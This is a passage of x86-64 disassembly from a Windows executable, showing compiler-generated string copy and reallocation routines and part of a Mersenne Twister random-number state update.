   140005f90:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   140005f97:	49 89 08             	mov    %rcx,(%r8)
   140005f9a:	2b d1                	sub    %ecx,%edx
   140005f9c:	48 8b 47 38          	mov    0x38(%rdi),%rax
   140005fa0:	48 89 08             	mov    %rcx,(%rax)
   140005fa3:	48 8b 47 50          	mov    0x50(%rdi),%rax
   140005fa7:	89 10                	mov    %edx,(%rax)
   140005fa9:	48 8b cf             	mov    %rdi,%rcx
   140005fac:	e8 bf fe ff ff       	call   0x140005e70
   140005fb1:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   140005fb8:	33 db                	xor    %ebx,%ebx
   140005fba:	84 c0                	test   %al,%al
   140005fbc:	48 0f 45 df          	cmovne %rdi,%rbx
   140005fc0:	ff 15 ea 25 00 00    	call   *0x25ea(%rip)        # 0x1400085b0
   140005fc6:	33 f6                	xor    %esi,%esi
   140005fc8:	85 c0                	test   %eax,%eax
   140005fca:	48 0f 44 f3          	cmove  %rbx,%rsi
   140005fce:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140005fd3:	eb 02                	jmp    0x140005fd7
   140005fd5:	33 f6                	xor    %esi,%esi
   140005fd7:	48 8b cf             	mov    %rdi,%rcx
   140005fda:	c6 47 7c 00          	movb   $0x0,0x7c(%rdi)
   140005fde:	c6 47 71 00          	movb   $0x0,0x71(%rdi)
   140005fe2:	ff 15 60 22 00 00    	call   *0x2260(%rip)        # 0x140008248
   140005fe8:	48 8b 0d 91 79 00 00 	mov    0x7991(%rip),%rcx        # 0x14000d980
   140005fef:	48 8b c6             	mov    %rsi,%rax
   140005ff2:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140005ff7:	48 89 4f 74          	mov    %rcx,0x74(%rdi)
   140005ffb:	48 c7 87 80 00 00 00 	movq   $0x0,0x80(%rdi)
   140006002:	00 00 00 00 
   140006006:	48 c7 47 68 00 00 00 	movq   $0x0,0x68(%rdi)
   14000600d:	00 
   14000600e:	48 83 c4 20          	add    $0x20,%rsp
   140006012:	5f                   	pop    %rdi
   140006013:	c3                   	ret
   140006014:	cc                   	int3
   140006015:	cc                   	int3
   140006016:	cc                   	int3
   140006017:	cc                   	int3
   140006018:	cc                   	int3
   140006019:	cc                   	int3
   14000601a:	cc                   	int3
   14000601b:	cc                   	int3
   14000601c:	cc                   	int3
   14000601d:	cc                   	int3
   14000601e:	cc                   	int3
   14000601f:	cc                   	int3
   140006020:	40 53                	rex push %rbx
   140006022:	48 83 ec 20          	sub    $0x20,%rsp
   140006026:	48 8b d9             	mov    %rcx,%rbx
   140006029:	ff 11                	call   *(%rcx)
   14000602b:	ff 15 f7 21 00 00    	call   *0x21f7(%rip)        # 0x140008228
   140006031:	ba 08 00 00 00       	mov    $0x8,%edx
   140006036:	48 8b cb             	mov    %rbx,%rcx
   140006039:	e8 62 09 00 00       	call   0x1400069a0
   14000603e:	33 c0                	xor    %eax,%eax
   140006040:	48 83 c4 20          	add    $0x20,%rsp
   140006044:	5b                   	pop    %rbx
   140006045:	c3                   	ret
   140006046:	cc                   	int3
   140006047:	cc                   	int3
   140006048:	cc                   	int3
   140006049:	cc                   	int3
   14000604a:	cc                   	int3
   14000604b:	cc                   	int3
   14000604c:	cc                   	int3
   14000604d:	cc                   	int3
   14000604e:	cc                   	int3
   14000604f:	cc                   	int3
   140006050:	48 8b c4             	mov    %rsp,%rax
   140006053:	48 89 58 10          	mov    %rbx,0x10(%rax)
   140006057:	48 89 68 18          	mov    %rbp,0x18(%rax)
   14000605b:	48 89 70 20          	mov    %rsi,0x20(%rax)
   14000605f:	57                   	push   %rdi
   140006060:	41 54                	push   %r12
   140006062:	41 55                	push   %r13
   140006064:	41 56                	push   %r14
   140006066:	41 57                	push   %r15
   140006068:	48 83 ec 50          	sub    $0x50,%rsp
   14000606c:	49 8b d8             	mov    %r8,%rbx
   14000606f:	4c 8b fa             	mov    %rdx,%r15
   140006072:	48 8b f9             	mov    %rcx,%rdi
   140006075:	0f 57 c0             	xorps  %xmm0,%xmm0
   140006078:	0f 11 40 b8          	movups %xmm0,-0x48(%rax)
   14000607c:	48 89 58 b8          	mov    %rbx,-0x48(%rax)
   140006080:	48 89 58 c0          	mov    %rbx,-0x40(%rax)
   140006084:	4c 89 48 c8          	mov    %r9,-0x38(%rax)
   140006088:	48 3b ca             	cmp    %rdx,%rcx
   14000608b:	0f 84 17 01 00 00    	je     0x1400061a8
   140006091:	45 33 e4             	xor    %r12d,%r12d
   140006094:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   14000609b:	ff ff 7f 
   14000609e:	b9 0a 00 00 00       	mov    $0xa,%ecx
   1400060a3:	49 bd fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%r13
   1400060aa:	ff ff 7f 
   1400060ad:	0f 1f 00             	nopl   (%rax)
   1400060b0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400060b3:	0f 11 03             	movups %xmm0,(%rbx)
   1400060b6:	4c 89 63 10          	mov    %r12,0x10(%rbx)
   1400060ba:	4c 89 63 18          	mov    %r12,0x18(%rbx)
   1400060be:	4c 8b f7             	mov    %rdi,%r14
   1400060c1:	48 83 7f 18 07       	cmpq   $0x7,0x18(%rdi)
   1400060c6:	76 03                	jbe    0x1400060cb
   1400060c8:	4c 8b 37             	mov    (%rdi),%r14
   1400060cb:	48 8b 6f 10          	mov    0x10(%rdi),%rbp
   1400060cf:	49 3b ed             	cmp    %r13,%rbp
   1400060d2:	0f 87 18 01 00 00    	ja     0x1400061f0
   1400060d8:	48 83 fd 07          	cmp    $0x7,%rbp
   1400060dc:	77 18                	ja     0x1400060f6
   1400060de:	48 89 6b 10          	mov    %rbp,0x10(%rbx)
   1400060e2:	48 c7 43 18 07 00 00 	movq   $0x7,0x18(%rbx)
   1400060e9:	00 
   1400060ea:	41 0f 10 06          	movups (%r14),%xmm0
   1400060ee:	0f 11 03             	movups %xmm0,(%rbx)
   1400060f1:	e9 9c 00 00 00       	jmp    0x140006192
   1400060f6:	48 8b f5             	mov    %rbp,%rsi
   1400060f9:	48 83 ce 07          	or     $0x7,%rsi
   1400060fd:	49 3b f5             	cmp    %r13,%rsi
   140006100:	76 3f                	jbe    0x140006141
   140006102:	49 8b f5             	mov    %r13,%rsi
   140006105:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   140006109:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140006110:	72 4e                	jb     0x140006160
   140006112:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140006116:	48 3b c1             	cmp    %rcx,%rax
   140006119:	0f 86 cb 00 00 00    	jbe    0x1400061ea
   14000611f:	48 8b c8             	mov    %rax,%rcx
   140006122:	e8 81 08 00 00       	call   0x1400069a8
   140006127:	48 8b c8             	mov    %rax,%rcx
   14000612a:	48 85 c0             	test   %rax,%rax
   14000612d:	0f 84 a1 00 00 00    	je     0x1400061d4
   140006133:	48 83 c0 27          	add    $0x27,%rax
   140006137:	48 83 e0 e0          	and    $0xffffffffffffffe0,%rax
   14000613b:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   14000613f:	eb 24                	jmp    0x140006165
   140006141:	48 83 fe 0a          	cmp    $0xa,%rsi
   140006145:	48 0f 42 f1          	cmovb  %rcx,%rsi
   140006149:	48 8d 4e 01          	lea    0x1(%rsi),%rcx
   14000614d:	48 3b c8             	cmp    %rax,%rcx
   140006150:	0f 87 94 00 00 00    	ja     0x1400061ea
   140006156:	48 03 c9             	add    %rcx,%rcx
   140006159:	75 ae                	jne    0x140006109
   14000615b:	49 8b c4             	mov    %r12,%rax
   14000615e:	eb 05                	jmp    0x140006165
   140006160:	e8 43 08 00 00       	call   0x1400069a8
   140006165:	48 89 03             	mov    %rax,(%rbx)
   140006168:	48 89 6b 10          	mov    %rbp,0x10(%rbx)
   14000616c:	48 89 73 18          	mov    %rsi,0x18(%rbx)
   140006170:	4c 8d 04 6d 02 00 00 	lea    0x2(,%rbp,2),%r8
   140006177:	00 
   140006178:	49 8b d6             	mov    %r14,%rdx
   14000617b:	48 8b c8             	mov    %rax,%rcx
   14000617e:	e8 88 18 00 00       	call   0x140007a0b
   140006183:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   14000618a:	ff ff 7f 
   14000618d:	b9 0a 00 00 00       	mov    $0xa,%ecx
   140006192:	48 83 c3 20          	add    $0x20,%rbx
   140006196:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   14000619b:	48 83 c7 20          	add    $0x20,%rdi
   14000619f:	49 3b ff             	cmp    %r15,%rdi
   1400061a2:	0f 85 08 ff ff ff    	jne    0x1400060b0
   1400061a8:	48 8b d3             	mov    %rbx,%rdx
   1400061ab:	48 8b cb             	mov    %rbx,%rcx
   1400061ae:	e8 4d 00 00 00       	call   0x140006200
   1400061b3:	48 8b c3             	mov    %rbx,%rax
   1400061b6:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   1400061bb:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   1400061bf:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   1400061c3:	49 8b 73 48          	mov    0x48(%r11),%rsi
   1400061c7:	49 8b e3             	mov    %r11,%rsp
   1400061ca:	41 5f                	pop    %r15
   1400061cc:	41 5e                	pop    %r14
   1400061ce:	41 5d                	pop    %r13
   1400061d0:	41 5c                	pop    %r12
   1400061d2:	5f                   	pop    %rdi
   1400061d3:	c3                   	ret
   1400061d4:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   1400061d9:	45 33 c9             	xor    %r9d,%r9d
   1400061dc:	45 33 c0             	xor    %r8d,%r8d
   1400061df:	33 d2                	xor    %edx,%edx
   1400061e1:	33 c9                	xor    %ecx,%ecx
   1400061e3:	ff 15 d7 22 00 00    	call   *0x22d7(%rip)        # 0x1400084c0
   1400061e9:	cc                   	int3
   1400061ea:	e8 a1 b0 ff ff       	call   0x140001290
   1400061ef:	cc                   	int3
   1400061f0:	e8 bb b1 ff ff       	call   0x1400013b0
   1400061f5:	cc                   	int3
   1400061f6:	cc                   	int3
   1400061f7:	cc                   	int3
   1400061f8:	cc                   	int3
   1400061f9:	cc                   	int3
   1400061fa:	cc                   	int3
   1400061fb:	cc                   	int3
   1400061fc:	cc                   	int3
   1400061fd:	cc                   	int3
   1400061fe:	cc                   	int3
   1400061ff:	cc                   	int3
   140006200:	48 3b ca             	cmp    %rdx,%rcx
   140006203:	74 7d                	je     0x140006282
   140006205:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000620a:	57                   	push   %rdi
   14000620b:	48 83 ec 30          	sub    $0x30,%rsp
   14000620f:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   140006214:	48 8b fa             	mov    %rdx,%rdi
   140006217:	33 f6                	xor    %esi,%esi
   140006219:	48 8b d9             	mov    %rcx,%rbx
   14000621c:	0f 1f 40 00          	nopl   0x0(%rax)
   140006220:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140006224:	48 83 fa 07          	cmp    $0x7,%rdx
   140006228:	76 31                	jbe    0x14000625b
   14000622a:	48 8b 0b             	mov    (%rbx),%rcx
   14000622d:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140006234:	00 
   140006235:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000623c:	72 18                	jb     0x140006256
   14000623e:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140006242:	48 83 c2 27          	add    $0x27,%rdx
   140006246:	48 2b c8             	sub    %rax,%rcx
   140006249:	48 83 e9 08          	sub    $0x8,%rcx
   14000624d:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140006251:	77 30                	ja     0x140006283
   140006253:	48 8b c8             	mov    %rax,%rcx
   140006256:	e8 45 07 00 00       	call   0x1400069a0
   14000625b:	48 89 73 10          	mov    %rsi,0x10(%rbx)
   14000625f:	48 c7 43 18 07 00 00 	movq   $0x7,0x18(%rbx)
   140006266:	00 
   140006267:	66 89 33             	mov    %si,(%rbx)
   14000626a:	48 83 c3 20          	add    $0x20,%rbx
   14000626e:	48 3b df             	cmp    %rdi,%rbx
   140006271:	75 ad                	jne    0x140006220
   140006273:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140006278:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000627d:	48 83 c4 30          	add    $0x30,%rsp
   140006281:	5f                   	pop    %rdi
   140006282:	c3                   	ret
   140006283:	45 33 c9             	xor    %r9d,%r9d
   140006286:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000628b:	45 33 c0             	xor    %r8d,%r8d
   14000628e:	33 d2                	xor    %edx,%edx
   140006290:	33 c9                	xor    %ecx,%ecx
   140006292:	ff 15 28 22 00 00    	call   *0x2228(%rip)        # 0x1400084c0
   140006298:	cc                   	int3
   140006299:	cc                   	int3
   14000629a:	cc                   	int3
   14000629b:	cc                   	int3
   14000629c:	cc                   	int3
   14000629d:	cc                   	int3
   14000629e:	cc                   	int3
   14000629f:	cc                   	int3
   1400062a0:	40 53                	rex push %rbx
   1400062a2:	55                   	push   %rbp
   1400062a3:	56                   	push   %rsi
   1400062a4:	41 57                	push   %r15
   1400062a6:	48 83 ec 38          	sub    $0x38,%rsp
   1400062aa:	48 8b 69 10          	mov    0x10(%rcx),%rbp
   1400062ae:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   1400062b5:	ff ff 7f 
   1400062b8:	48 8b c3             	mov    %rbx,%rax
   1400062bb:	45 0f b6 f9          	movzbl %r9b,%r15d
   1400062bf:	48 2b c5             	sub    %rbp,%rax
   1400062c2:	48 8b f1             	mov    %rcx,%rsi
   1400062c5:	48 83 f8 01          	cmp    $0x1,%rax
   1400062c9:	0f 82 39 01 00 00    	jb     0x140006408
   1400062cf:	48 89 7c 24 68       	mov    %rdi,0x68(%rsp)
   1400062d4:	4c 89 64 24 70       	mov    %r12,0x70(%rsp)
   1400062d9:	4c 8d 65 01          	lea    0x1(%rbp),%r12
   1400062dd:	49 8b d4             	mov    %r12,%rdx
   1400062e0:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   1400062e5:	4c 8b 71 18          	mov    0x18(%rcx),%r14
   1400062e9:	48 83 ca 0f          	or     $0xf,%rdx
   1400062ed:	48 3b d3             	cmp    %rbx,%rdx
   1400062f0:	77 44                	ja     0x140006336
   1400062f2:	49 8b ce             	mov    %r14,%rcx
   1400062f5:	48 8b c3             	mov    %rbx,%rax
   1400062f8:	48 d1 e9             	shr    $1,%rcx
   1400062fb:	48 2b c1             	sub    %rcx,%rax
   1400062fe:	4c 3b f0             	cmp    %rax,%r14
   140006301:	77 33                	ja     0x140006336
   140006303:	49 8d 04 0e          	lea    (%r14,%rcx,1),%rax
   140006307:	48 8b da             	mov    %rdx,%rbx
   14000630a:	48 3b d0             	cmp    %rax,%rdx
   14000630d:	48 0f 42 d8          	cmovb  %rax,%rbx
   140006311:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   140006315:	48 85 c9             	test   %rcx,%rcx
   140006318:	75 04                	jne    0x14000631e
   14000631a:	33 ff                	xor    %edi,%edi
   14000631c:	eb 49                	jmp    0x140006367
   14000631e:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140006325:	72 38                	jb     0x14000635f
   140006327:	48 8d 41 27          	lea    0x27(%rcx),%rax
   14000632b:	48 3b c1             	cmp    %rcx,%rax
   14000632e:	0f 86 da 00 00 00    	jbe    0x14000640e
   140006334:	eb 0e                	jmp    0x140006344
   140006336:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   14000633d:	00 00 80 
   140006340:	48 83 c0 27          	add    $0x27,%rax
   140006344:	48 8b c8             	mov    %rax,%rcx
   140006347:	e8 5c 06 00 00       	call   0x1400069a8
   14000634c:	48 85 c0             	test   %rax,%rax
   14000634f:	74 6d                	je     0x1400063be
   140006351:	48 8d 78 27          	lea    0x27(%rax),%rdi
   140006355:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   140006359:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   14000635d:	eb 08                	jmp    0x140006367
   14000635f:	e8 44 06 00 00       	call   0x1400069a8
   140006364:	48 8b f8             	mov    %rax,%rdi
   140006367:	4c 89 66 10          	mov    %r12,0x10(%rsi)
   14000636b:	4c 8b c5             	mov    %rbp,%r8
   14000636e:	48 89 5e 18          	mov    %rbx,0x18(%rsi)
   140006372:	48 8b cf             	mov    %rdi,%rcx
   140006375:	49 83 fe 0f          	cmp    $0xf,%r14
   140006379:	76 5d                	jbe    0x1400063d8
   14000637b:	48 8b 1e             	mov    (%rsi),%rbx
   14000637e:	48 8b d3             	mov    %rbx,%rdx
   140006381:	e8 85 16 00 00       	call   0x140007a0b
   140006386:	49 8d 56 01          	lea    0x1(%r14),%rdx
   14000638a:	44 88 3c 2f          	mov    %r15b,(%rdi,%rbp,1)
   14000638e:	c6 44 2f 01 00       	movb   $0x0,0x1(%rdi,%rbp,1)
   140006393:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000639a:	72 18                	jb     0x1400063b4
   14000639c:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   1400063a0:	48 83 c2 27          	add    $0x27,%rdx
   1400063a4:	48 2b d8             	sub    %rax,%rbx
   1400063a7:	48 83 eb 08          	sub    $0x8,%rbx
   1400063ab:	48 83 fb 1f          	cmp    $0x1f,%rbx
   1400063af:	77 0d                	ja     0x1400063be
   1400063b1:	48 8b d8             	mov    %rax,%rbx
   1400063b4:	48 8b cb             	mov    %rbx,%rcx
   1400063b7:	e8 e4 05 00 00       	call   0x1400069a0
   1400063bc:	eb 2b                	jmp    0x1400063e9
   1400063be:	45 33 c9             	xor    %r9d,%r9d
   1400063c1:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400063c8:	00 00 
   1400063ca:	45 33 c0             	xor    %r8d,%r8d
   1400063cd:	33 d2                	xor    %edx,%edx
   1400063cf:	33 c9                	xor    %ecx,%ecx
   1400063d1:	ff 15 e9 20 00 00    	call   *0x20e9(%rip)        # 0x1400084c0
   1400063d7:	cc                   	int3
   1400063d8:	48 8b d6             	mov    %rsi,%rdx
   1400063db:	e8 2b 16 00 00       	call   0x140007a0b
   1400063e0:	44 88 3c 2f          	mov    %r15b,(%rdi,%rbp,1)
   1400063e4:	c6 44 2f 01 00       	movb   $0x0,0x1(%rdi,%rbp,1)
   1400063e9:	48 89 3e             	mov    %rdi,(%rsi)
   1400063ec:	48 8b c6             	mov    %rsi,%rax
   1400063ef:	4c 8b 64 24 70       	mov    0x70(%rsp),%r12
   1400063f4:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   1400063f9:	4c 8b 74 24 30       	mov    0x30(%rsp),%r14
   1400063fe:	48 83 c4 38          	add    $0x38,%rsp
   140006402:	41 5f                	pop    %r15
   140006404:	5e                   	pop    %rsi
   140006405:	5d                   	pop    %rbp
   140006406:	5b                   	pop    %rbx
   140006407:	c3                   	ret
   140006408:	e8 a3 af ff ff       	call   0x1400013b0
   14000640d:	cc                   	int3
   14000640e:	e8 7d ae ff ff       	call   0x140001290
   140006413:	cc                   	int3
   140006414:	cc                   	int3
   140006415:	cc                   	int3
   140006416:	cc                   	int3
   140006417:	cc                   	int3
   140006418:	cc                   	int3
   140006419:	cc                   	int3
   14000641a:	cc                   	int3
   14000641b:	cc                   	int3
   14000641c:	cc                   	int3
   14000641d:	cc                   	int3
   14000641e:	cc                   	int3
   14000641f:	cc                   	int3
   140006420:	48 8b 09             	mov    (%rcx),%rcx
   140006423:	48 85 c9             	test   %rcx,%rcx
   140006426:	0f 85 a4 f9 ff ff    	jne    0x140005dd0
   14000642c:	c3                   	ret
   14000642d:	cc                   	int3
   14000642e:	cc                   	int3
   14000642f:	cc                   	int3
   140006430:	40 53                	rex push %rbx
   140006432:	55                   	push   %rbp
   140006433:	56                   	push   %rsi
   140006434:	48 83 ec 40          	sub    $0x40,%rsp
   140006438:	48 8b 69 10          	mov    0x10(%rcx),%rbp
   14000643c:	48 bb fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%rbx
   140006443:	ff ff 7f 
   140006446:	48 8b c3             	mov    %rbx,%rax
   140006449:	48 8b f1             	mov    %rcx,%rsi
   14000644c:	48 2b c5             	sub    %rbp,%rax
   14000644f:	48 3b c2             	cmp    %rdx,%rax
   140006452:	0f 82 70 01 00 00    	jb     0x1400065c8
   140006458:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   14000645d:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   140006462:	4c 8b 71 18          	mov    0x18(%rcx),%r14
   140006466:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   14000646b:	4c 8d 3c 2a          	lea    (%rdx,%rbp,1),%r15
   14000646f:	49 8b d7             	mov    %r15,%rdx
   140006472:	48 83 ca 07          	or     $0x7,%rdx
   140006476:	48 3b d3             	cmp    %rbx,%rdx
   140006479:	77 3f                	ja     0x1400064ba
   14000647b:	49 8b ce             	mov    %r14,%rcx
   14000647e:	48 8b c3             	mov    %rbx,%rax
   140006481:	48 d1 e9             	shr    $1,%rcx
   140006484:	48 2b c1             	sub    %rcx,%rax
   140006487:	4c 3b f0             	cmp    %rax,%r14
   14000648a:	77 2e                	ja     0x1400064ba
   14000648c:	49 8d 04 0e          	lea    (%r14,%rcx,1),%rax
   140006490:	48 8b da             	mov    %rdx,%rbx
   140006493:	48 3b d0             	cmp    %rax,%rdx
   140006496:	48 0f 42 d8          	cmovb  %rax,%rbx
   14000649a:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   1400064a1:	ff ff 7f 
   1400064a4:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   1400064a8:	48 3b c8             	cmp    %rax,%rcx
   1400064ab:	0f 87 1d 01 00 00    	ja     0x1400065ce
   1400064b1:	48 03 c9             	add    %rcx,%rcx
   1400064b4:	75 12                	jne    0x1400064c8
   1400064b6:	33 ff                	xor    %edi,%edi
   1400064b8:	eb 4b                	jmp    0x140006505
   1400064ba:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   1400064c1:	ff ff 7f 
   1400064c4:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   1400064c8:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   1400064cf:	72 2c                	jb     0x1400064fd
   1400064d1:	48 8d 41 27          	lea    0x27(%rcx),%rax
   1400064d5:	48 3b c1             	cmp    %rcx,%rax
   1400064d8:	0f 86 f0 00 00 00    	jbe    0x1400065ce
   1400064de:	48 8b c8             	mov    %rax,%rcx
   1400064e1:	e8 c2 04 00 00       	call   0x1400069a8
   1400064e6:	48 85 c0             	test   %rax,%rax
   1400064e9:	0f 84 8f 00 00 00    	je     0x14000657e
   1400064ef:	48 8d 78 27          	lea    0x27(%rax),%rdi
   1400064f3:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   1400064f7:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   1400064fb:	eb 08                	jmp    0x140006505
   1400064fd:	e8 a6 04 00 00       	call   0x1400069a8
   140006502:	48 8b f8             	mov    %rax,%rdi
   140006505:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   14000650c:	00 
   14000650d:	48 8d 2c 6d 02 00 00 	lea    0x2(,%rbp,2),%rbp
   140006514:	00 
   140006515:	4c 89 7e 10          	mov    %r15,0x10(%rsi)
   140006519:	48 8d 15 20 27 00 00 	lea    0x2720(%rip),%rdx        # 0x140008c40
   140006520:	48 89 5e 18          	mov    %rbx,0x18(%rsi)
   140006524:	48 8b cf             	mov    %rdi,%rcx
   140006527:	4c 8d 04 00          	lea    (%rax,%rax,1),%r8
   14000652b:	4d 8d 3c 38          	lea    (%r8,%rdi,1),%r15
   14000652f:	49 83 fe 07          	cmp    $0x7,%r14
   140006533:	76 63                	jbe    0x140006598
   140006535:	48 8b 1e             	mov    (%rsi),%rbx
   140006538:	e8 ce 14 00 00       	call   0x140007a0b
   14000653d:	4c 8b c5             	mov    %rbp,%r8
   140006540:	48 8b d3             	mov    %rbx,%rdx
   140006543:	49 8b cf             	mov    %r15,%rcx
   140006546:	e8 c0 14 00 00       	call   0x140007a0b
   14000654b:	4a 8d 14 75 02 00 00 	lea    0x2(,%r14,2),%rdx
   140006552:	00 
   140006553:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000655a:	72 18                	jb     0x140006574
   14000655c:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   140006560:	48 83 c2 27          	add    $0x27,%rdx
   140006564:	48 2b d8             	sub    %rax,%rbx
   140006567:	48 83 eb 08          	sub    $0x8,%rbx
   14000656b:	48 83 fb 1f          	cmp    $0x1f,%rbx
   14000656f:	77 0d                	ja     0x14000657e
   140006571:	48 8b d8             	mov    %rax,%rbx
   140006574:	48 8b cb             	mov    %rbx,%rcx
   140006577:	e8 24 04 00 00       	call   0x1400069a0
   14000657c:	eb 2d                	jmp    0x1400065ab
   14000657e:	45 33 c9             	xor    %r9d,%r9d
   140006581:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140006588:	00 00 
   14000658a:	45 33 c0             	xor    %r8d,%r8d
   14000658d:	33 d2                	xor    %edx,%edx
   14000658f:	33 c9                	xor    %ecx,%ecx
   140006591:	ff 15 29 1f 00 00    	call   *0x1f29(%rip)        # 0x1400084c0
   140006597:	cc                   	int3
   140006598:	e8 6e 14 00 00       	call   0x140007a0b
   14000659d:	4c 8b c5             	mov    %rbp,%r8
   1400065a0:	48 8b d6             	mov    %rsi,%rdx
   1400065a3:	49 8b cf             	mov    %r15,%rcx
   1400065a6:	e8 60 14 00 00       	call   0x140007a0b
   1400065ab:	48 89 3e             	mov    %rdi,(%rsi)
   1400065ae:	48 8b c6             	mov    %rsi,%rax
   1400065b1:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   1400065b6:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   1400065bb:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15
   1400065c0:	48 83 c4 40          	add    $0x40,%rsp
   1400065c4:	5e                   	pop    %rsi
   1400065c5:	5d                   	pop    %rbp
   1400065c6:	5b                   	pop    %rbx
   1400065c7:	c3                   	ret
   1400065c8:	e8 e3 ad ff ff       	call   0x1400013b0
   1400065cd:	cc                   	int3
   1400065ce:	e8 bd ac ff ff       	call   0x140001290
   1400065d3:	cc                   	int3
   1400065d4:	cc                   	int3
   1400065d5:	cc                   	int3
   1400065d6:	cc                   	int3
   1400065d7:	cc                   	int3
   1400065d8:	cc                   	int3
   1400065d9:	cc                   	int3
   1400065da:	cc                   	int3
   1400065db:	cc                   	int3
   1400065dc:	cc                   	int3
   1400065dd:	cc                   	int3
   1400065de:	cc                   	int3
   1400065df:	cc                   	int3
   1400065e0:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   1400065e4:	48 8b 09             	mov    (%rcx),%rcx
   1400065e7:	e9 14 fc ff ff       	jmp    0x140006200
   1400065ec:	cc                   	int3
   1400065ed:	cc                   	int3
   1400065ee:	cc                   	int3
   1400065ef:	cc                   	int3
   1400065f0:	8b 11                	mov    (%rcx),%edx
   1400065f2:	41 ba 70 02 00 00    	mov    $0x270,%r10d
   1400065f8:	4c 8b c9             	mov    %rcx,%r9
   1400065fb:	41 3b d2             	cmp    %r10d,%edx
   1400065fe:	75 51                	jne    0x140006651
   140006600:	4c 8d 41 08          	lea    0x8(%rcx),%r8
   140006604:	0f 1f 40 00          	nopl   0x0(%rax)
   140006608:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000660f:	00 
   140006610:	41 8b 50 fc          	mov    -0x4(%r8),%edx
   140006614:	41 33 10             	xor    (%r8),%edx
   140006617:	4d 8d 40 04          	lea    0x4(%r8),%r8
   14000661b:	0f ba f2 1f          	btr    $0x1f,%edx
   14000661f:	41 33 50 f8          	xor    -0x8(%r8),%edx
   140006623:	8b c2                	mov    %edx,%eax
   140006625:	24 01                	and    $0x1,%al
   140006627:	f6 d8                	neg    %al
   140006629:	1b c9                	sbb    %ecx,%ecx
   14000662b:	d1 ea                	shr    $1,%edx
   14000662d:	81 e1 df b0 08 99    	and    $0x9908b0df,%ecx
   140006633:	41 33 88 2c 06 00 00 	xor    0x62c(%r8),%ecx
   14000663a:	33 ca                	xor    %edx,%ecx
   14000663c:	41 89 88 b8 09 00 00 	mov    %ecx,0x9b8(%r8)
   140006643:	49 83 ea 01          	sub    $0x1,%r10
   140006647:	75 c7                	jne    0x140006610
   140006649:	41 8b 11             	mov    (%r9),%edx
   14000664c:	e9 e0 00 00 00       	jmp    0x140006731
   140006651:	81 fa e0 04 00 00    	cmp    $0x4e0,%edx
   140006657:	0f 82 d4 00 00 00    	jb     0x140006731
   14000665d:	4c 8d 81 c8 09 00 00 	lea    0x9c8(%rcx),%r8
   140006664:	41 ba e3 00 00 00    	mov    $0xe3,%r10d
   14000666a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140006670:	41 8b 50 fc          	mov    -0x4(%r8),%edx
   140006674:	41 33 10             	xor    (%r8),%edx
   140006677:	4d 8d 40 04          	lea    0x4(%r8),%r8
   14000667b:	0f ba f2 1f          	btr    $0x1f,%edx
   14000667f:	41 33 50 f8          	xor    -0x8(%r8),%edx
   140006683:	8b c2                	mov    %edx,%eax
   140006685:	24 01                	and    $0x1,%al
   140006687:	f6 d8                	neg    %al
   140006689:	1b c9                	sbb    %ecx,%ecx
   14000668b:	d1 ea                	shr    $1,%edx
